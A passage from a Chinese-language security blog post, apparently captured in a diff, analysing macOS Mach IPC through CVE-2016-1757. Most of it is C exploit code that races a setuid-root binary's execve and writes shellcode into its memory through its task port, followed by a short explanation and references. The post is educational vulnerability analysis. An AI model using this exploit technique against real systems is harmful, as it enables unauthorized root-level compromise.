mach_error(&quot;failed to mach_vm_allocate memory&quot;, err);</div><div class="line">    return;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  FILE* f = fopen(suid_binary_path, &quot;r&quot;);</div><div class="line">  fseek(f, 0x1000, SEEK_SET);</div><div class="line"></div><div class="line">  fread((char*)addr, 0x1000, 1, f);</div><div class="line">  fclose(f);</div><div class="line">  </div><div class="line">  memcpy(((char*)addr)+0x53c, shellcode, sizeof(shellcode));</div><div class="line"></div><div class="line">  // wait to get the child&apos;s task port on the service port:</div><div class="line">  //等待子进程发送过来的任务端口</div><div class="line">  task_msg_recv_t msg = &#123;0&#125;;</div><div class="line">  err = mach_msg(&amp;msg.header,</div><div class="line">                 MACH_RCV_MSG,</div><div class="line">                 0,</div><div class="line">                 sizeof(msg),</div><div class="line">                 service_port,</div><div class="line">                 MACH_MSG_TIMEOUT_NONE,</div><div class="line">                 MACH_PORT_NULL);</div><div class="line"></div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;error receiving service message&quot;, err);</div><div class="line">    return;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  mach_port_t target_task_port = msg.port.name;</div><div class="line">  </div><div class="line">  // before we ack the task port message to signal that the other process should execve the suid</div><div class="line">  // binary get the lowest mapped address:</div><div class="line">  //对任务端口的消息做出应答之前确定是否为setuid的进程</div><div class="line">  struct vm_region_basic_info_64 region;</div><div class="line">  mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_COUNT_64;</div><div class="line">  memory_object_name_t object_name = MACH_PORT_NULL; /* unused */</div><div class="line">  </div><div class="line">  mach_vm_size_t target_first_size = 0x1000;</div><div class="line">  mach_vm_address_t original_first_addr = 0x0;</div><div class="line">  //获取虚拟内存的信息</div><div class="line">  err = mach_vm_region(target_task_port,</div><div class="line">                       &amp;original_first_addr,</div><div class="line">                       &amp;target_first_size,</div><div class="line">                       VM_REGION_BASIC_INFO_64,</div><div class="line">                       (vm_region_info_t)&amp;region,</div><div class="line">                       &amp;region_count,</div><div class="line">                       &amp;object_name);</div><div class="line"></div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;unable to get first mach_vm_region for target process\n&quot;, err);</div><div class="line">    return;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  printf(&quot;[+] looks like the target processes lowest mapping is at %zx prior to execve\n&quot;, original_first_addr);</div><div class="line"></div><div class="line">  // send an ack message to the reply port indicating that we have the thread port</div><div class="line">  //发送消息作出回应</div><div class="line">  ack_msg_send_t ack = &#123;0&#125;;</div><div class="line"></div><div class="line">  mach_msg_type_name_t reply_port_rights = MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits);</div><div class="line"></div><div class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, 0);</div><div class="line">  ack.header.msgh_size = sizeof(ack);</div><div class="line">  ack.header.msgh_local_port = MACH_PORT_NULL;</div><div class="line">  ack.header.msgh_remote_port = msg.header.msgh_remote_port;</div><div class="line">  ack.header.msgh_bits = MACH_MSGH_BITS(reply_port_rights, 0); // use the same rights we got</div><div class="line"> </div><div class="line">  err = mach_msg_send(&amp;ack.header);</div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;parent failed sending ack&quot;, err);</div><div class="line">    return;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  mach_vm_address_t target_first_addr = 0x0;</div><div class="line">  //不断地循环直到获得的内存信息与之前不同</div><div class="line">  for (;;) &#123;</div><div class="line">    // wait until we see that the map has been swapped and the binary is loaded into it:</div><div class="line">    region_count = VM_REGION_BASIC_INFO_COUNT_64;</div><div class="line">    object_name = MACH_PORT_NULL; /* unused */</div><div class="line">    target_first_size = 0x1000;</div><div class="line">    target_first_addr = 0x0;</div><div class="line"></div><div class="line">    err = mach_vm_region(target_task_port,</div><div class="line">                         &amp;target_first_addr,</div><div class="line">                         &amp;target_first_size,</div><div class="line">                         VM_REGION_BASIC_INFO_64,</div><div class="line">                         (vm_region_info_t)&amp;region,</div><div class="line">                         &amp;region_count,</div><div class="line">                         &amp;object_name);</div><div class="line"></div><div class="line">    if (target_first_addr != original_first_addr &amp;&amp; target_first_addr &lt; 0x200000000) &#123;</div><div class="line">      // the first address has changed implying that the map was swapped</div><div class="line">      // let&apos;s try to win the race</div><div class="line">      break;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  &#125;</div><div class="line"></div><div class="line">  mach_vm_address_t target_addr = target_first_addr + 0x1000;</div><div class="line">  mach_msg_type_number_t target_size = 0x1000;</div><div class="line">  mach_vm_protect(target_task_port, target_addr, target_size, 0, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);</div><div class="line">  mach_vm_write(target_task_port, target_addr, addr, target_size);</div><div class="line"></div><div class="line">  printf(&quot;hopefully overwrote some code in the target...\n&quot;);</div><div class="line">  printf(&quot;the target first addr changed to %zx\n&quot;, target_first_addr);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void do_child() &#123;</div><div class="line">  kern_return_t err;</div><div class="line"></div><div class="line">  mach_port_t bootstrap_port;</div><div class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</div><div class="line"></div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;child can&apos;t get bootstrap port&quot;, err);</div><div class="line">    return;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  mach_port_t service_port;</div><div class="line">  err = bootstrap_look_up(bootstrap_port, service_name, &amp;service_port);</div><div class="line">  </div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;child can&apos;t get service port&quot;, err);</div><div class="line">    return;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  // create a reply port:</div><div class="line">  //创建一个有接收消息权限的port</div><div class="line">  mach_port_t reply_port;</div><div class="line">  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;reply_port);</div><div class="line">  </div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;child unable to allocate reply port&quot;, err);</div><div class="line">    return;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  // send it our task port</div><div class="line">  //将我们的任务端口发送给父进程</div><div class="line">  task_msg_send_t msg = &#123;0&#125;;</div><div class="line"></div><div class="line">  msg.header.msgh_size = sizeof(msg);</div><div class="line">  msg.header.msgh_local_port = reply_port;</div><div class="line">  msg.header.msgh_remote_port = service_port;</div><div class="line">  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;</div><div class="line">  </div><div class="line">  msg.body.msgh_descriptor_count = 1;</div><div class="line"></div><div class="line">  msg.port.name = mach_task_self();</div><div class="line">  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;</div><div class="line">  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;</div><div class="line"></div><div class="line">  err = mach_msg_send(&amp;msg.header);</div><div class="line"></div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;child unable to send thread port message&quot;, err);</div><div class="line">    return;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  // wait for a reply to ack that the other end got our thread port</div><div class="line">  //等待父进程的应答</div><div class="line">  ack_msg_recv_t reply = &#123;0&#125;;</div><div class="line">  err = mach_msg(&amp;reply.header, MACH_RCV_MSG, 0, sizeof(reply), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</div><div class="line"></div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;child unable to receive ack&quot;, err);</div><div class="line">    return;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  // exec the suid-root binary</div><div class="line">  //执行有root权限的setuid进程</div><div class="line">  char* argv[] = &#123;suid_binary_path, &quot;-w&quot;, &quot;rofl&quot;, NULL&#125;;</div><div class="line">  char* envp[] = &#123;NULL&#125;;</div><div class="line">  execve(suid_binary_path, argv, envp);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">int main() &#123;</div><div class="line">  kern_return_t err;</div><div class="line"></div><div class="line">  // register a name with launchd</div><div class="line">  mach_port_t bootstrap_port;</div><div class="line">  err = task_get_bootstrap_port(mach_task_self(), &amp;bootstrap_port);</div><div class="line"></div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;can&apos;t get bootstrap port&quot;, err);</div><div class="line">    return 1;</div><div class="line">  &#125;</div><div class="line">  //创建一个具有接收消息权限的port</div><div class="line">  mach_port_t service_port;</div><div class="line">  err = mach_port_allocate(mach_task_self(),</div><div class="line">                           MACH_PORT_RIGHT_RECEIVE,</div><div class="line">                           &amp;service_port);</div><div class="line">  </div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;can&apos;t allocate service port&quot;, err);</div><div class="line">    return 1;</div><div class="line">  &#125;</div><div class="line">  //为port添加发送权限</div><div class="line">  err = mach_port_insert_right(mach_task_self(),</div><div class="line">                               service_port,</div><div class="line">                               service_port,</div><div class="line">                               MACH_MSG_TYPE_MAKE_SEND);</div><div class="line">  </div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;can&apos;t insert make send right&quot;, err);</div><div class="line">    return 1;</div><div class="line">  &#125;</div><div class="line">  //注册一个全局port</div><div class="line">  err = bootstrap_register(bootstrap_port, service_name, service_port);</div><div class="line">  </div><div class="line">  if (err != KERN_SUCCESS) &#123;</div><div class="line">    mach_error(&quot;can&apos;t register service port&quot;, err);</div><div class="line">    return 1;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  printf(&quot;[+] registered service \&quot;%s\&quot; with launchd to receive child thread port\n&quot;, service_name);</div><div class="line"></div><div class="line">  // fork a child</div><div class="line">  //fork子进程，做出判断决定调用哪个函数</div><div class="line">  pid_t child_pid = fork();</div><div class="line">  if (child_pid == 0) &#123;</div><div class="line">    do_child();</div><div class="line">  &#125; else &#123;</div><div class="line">    do_parent(service_port);</div><div class="line">    int status;</div><div class="line">    wait(&amp;status);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>可以看出主要有三个函数:</p>
+<ol>
+<li>do_parent–根据子进程发送的port判断是否为suid进程，并对子进程进行回应后找到对应点写入行shellcode</li>
+<li>do_child–将自己的port发送给父进程，得到父进程的回应后执行suid进程</li>
+<li>main–创建了port之后fork出子程序，根据不同的函数做不同的事</li>
+</ol>
+<p>通过对以上漏洞分析，我们巩固了一些基础知识:</p>
+<ul>
+<li><code>mach_msg()</code></li>
+<li><code>mach_port_right</code></li>
+<li><code>mach_vm_*</code></li>
+</ul>
+<p>以上分析只是用到了ipc用户态的一些知识，接下来可以通过分析其他有关mach_ports的漏洞来进行一个ipc的深入理解</p>
+<p>参考:《深入解析OSX&amp;iOS操作系统》<br><a href="https://jaq.alibaba.com/community/art/show?articleid=687" target="_blank" rel="external">黑云压城城欲摧-2016年iOS公开可以用漏洞总结</a><br><a href="https://jaq.alibaba.com/community/art/show?articleid=687" target="_blank" rel="external">CVE-2016-1757简单分析](http://turingh.github.io/2016/04/03/CVE-2016-1757简单分析/#3-3_do_parent)</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/02/12/seven-BLOG/">通过cve-2016-1757浅谈Mach IPC</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">凌迟</a></p>
+        <p><span>发布时间:</span>2017-02-12, 14:43:56</p>
+        <p><span>最后更新:</span>2017-03-20, 08:38:11</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/02/12/seven-BLOG/" title="通过cve-2016-1757浅谈Mach IPC">http://Hello-Sherlock.github.io/2017/02/12/seven-BLOG/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://Hello-Sherlock.github.io/2017/02/12/seven-BLOG/　　作者: 凌迟" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2017/03/22/eight-Blog/">
+                    常见的iOS应用安全检测(整理)
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/01/04/six-Blog/">
+                    Mach-O加载流程
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#第一部分—-基本概念"><span class="toc-number">1.</span> <span class="toc-text">第一部分—-基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#消息"><span class="toc-number">1.1.</span> <span class="toc-text">消息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#port"><span class="toc-number">1.2.</span> <span class="toc-text">port</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#虚拟内存"><span class="toc-number">1.3.</span> <span class="toc-text">虚拟内存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二部分—-cve-2016-1757分析"><span class="toc-number">2.</span> <span class="toc-text">第二部分—-cve-2016-1757分析</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"通过cve-2016-1757浅谈Mach IPC　| 凌迟　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section class="youyan" id="comments">
+<!-- UY BEGIN -->
+<div id="uyan_frame"></div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2128116"></script>
+<!-- UY END -->
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/03/22/eight-Blog/" title="上一篇: 常见的iOS应用安全检测(整理)">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/01/04/six-Blog/" title="下一篇: Mach-O加载流程">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/22/thi-Blog/">关于短信拦截插件SMSAnti的实现</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/18/twe-Blog/">浅析mach_portal（3）— CVE-2016-7661</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/16/ele-Blog/">浅析mach_portal（2）— CVE-2016-7644</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/15/ten-Blog/">浅析mach_portal（1）— CVE-2016-7637</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/17/night-Blog/">【翻译】macOS 10.12.2本地提权和XNU port堆风水</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/22/eight-Blog/">常见的iOS应用安全检测(整理)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/12/seven-BLOG/">通过cve-2016-1757浅谈Mach IPC</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/04/six-Blog/">Mach-O加载流程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/20/five-Blog/">某记账app内购破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/15/four-Blog/">OSX内核调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/06/three-Blog/">Mach-O文件格式</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/01/two-Blog/">通过debugserver&lldb来调试一个被加了ptrace反调试的app</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/24/one-Blog/">Introspy对iOS应用黑盒测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/24/hello-world/">第一篇博客</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2017 凌迟
+            </div>
+            <div class="footer-right">
+                 Hello,SherlockHolmes <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 🍊 " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 🍉~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
